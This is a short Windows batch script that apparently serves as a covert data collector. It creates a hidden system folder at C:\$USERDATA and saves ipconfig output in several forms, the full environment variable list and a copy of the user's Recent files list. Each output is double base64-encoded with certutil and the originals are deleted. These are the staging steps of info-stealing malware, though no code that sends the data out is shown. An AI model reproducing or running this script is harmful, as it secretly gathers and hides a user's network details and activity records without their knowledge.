@echo off
chcp 65001>nul
setlocal
goto start

:e
set ofn=%~1
set nfn1=%ofn:~0,-4%.b64
set nfn2=%nfn1%_2
certutil -encode %ofn% %nfn1%
certutil -encode %nfn1% %nfn2%
del /q %ofn%
del /q %nfn1%
exit /b

:start
cd C:\
mkdir "$USERDATA"
attrib +s +h $USERDATA
cd $USERDATA
ipconfig /renew > renew.ipconfig.txt
call :e renew.ipconfig.txt
ipconfig > ipconfig.txt
call :e ipconfig.txt
ipconfig /all > all.ipconfig.txt
call :e all.ipconfig.txt
ipconfig /allcompartments > allcompartments.ipconfig.txt
call :e allcompartments.ipconfig.txt
ipconfig /allcompartments /all > all.allcompartments.ipconfig.txt
call :e all.allcompartments.ipconfig.txt
mkdir pdata
cd pdata
set > set.txt
call :e set.txt
cd %userprofile%\AppData\Roaming\Microsoft\Windows
xcopy /b /q /i Recent C:\$USERDATA\pdata\Recent

